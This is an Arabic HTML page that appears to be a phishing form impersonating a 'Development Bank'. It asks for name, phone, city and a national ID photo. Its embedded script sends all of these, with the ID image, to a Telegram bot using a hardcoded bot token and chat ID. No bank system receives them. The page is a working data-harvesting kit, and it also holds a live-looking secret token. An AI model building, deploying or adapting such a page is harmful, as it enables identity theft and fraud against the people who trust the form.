<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقديم الطلب | بنك التنمية</title>
    <style>
        :root { --primary: #006c35; --gray: #f4f7f5; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--gray); margin: 0; padding: 20px; direction: rtl; }
        .apply-box { max-width: 500px; margin: auto; background: white; border-radius: 25px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .form-title { text-align: center; color: var(--primary); margin-bottom: 25px; }
        .input-field { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #444; }
        input { width: 100%; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; box-sizing: border-box; }
        .btn-send { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 10px; }
        #loader { display: none; text-align: center; padding: 15px; color: var(--primary); font-weight: bold; }
    </style>
</head>
<body>

<div class="apply-box">
    <h2 class="form-title">إكمال بيانات التمويل</h2>
    <form id="tgForm">
        <div class="input-field">
            <label>الاسم الكامل</label>
            <input type="text" id="name" placeholder="اكتب اسمك هنا" required>
        </div>
        <div class="input-field">
            <label>رقم الجوال</label>
            <input type="tel" id="phone" placeholder="05xxxxxxxx" required>
        </div>
        <div class="input-field">
            <label>المدينة</label>
            <input type="text" id="city" placeholder="مثلاً: الرياض" required>
        </div>
        <div class="input-field">
            <label>صورة الهوية الوطنية</label>
            <input type="file" id="idImg" accept="image/*" required>
        </div>
        <button type="submit" class="btn-send" id="submitBtn">إرسال الطلب الآن</button>
    </form>
    <div id="loader">⏳ جاري إرسال طلبك لتليجرام...</div>
</div>

<script>
    const TG_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8';
    const TG_CHAT_ID = '5516597110';

    document.getElementById('tgForm').onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        const loader = document.getElementById('loader');
        const financeType = localStorage.getItem('selectedFinance') || 'عام';

        btn.style.display = 'none';
        loader.style.display = 'block';

        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const city = document.getElementById('city').value;
        const fileInput = document.getElementById('idImg');
        const file = fileInput.files[0];

        try {
            // 1. إرسال البيانات النصية
            const message = `🚀 *طلب تمويل جديد*\n\n` +
                            `*النوع:* ${financeType}\n` +
                            `*الاسم:* ${name}\n` +
                            `*الجوال:* ${phone}\n` +
                            `*المدينة:* ${city}`;

            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            // 2. إرسال صورة الهوية
            const formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('photo', file);
            formData.append('caption', `🖼 صورة هوية العميل: ${name}`);

            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            alert('يا هلا بك! تم استلام طلبك بنجاح وسنتواصل معك قريباً.');
            window.location.href = 'index.html';

        } catch (error) {
            alert('حدث خطأ في الإرسال، تأكد من اتصالك بالإنترنت.');
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    };
</script>
</body>
</html>
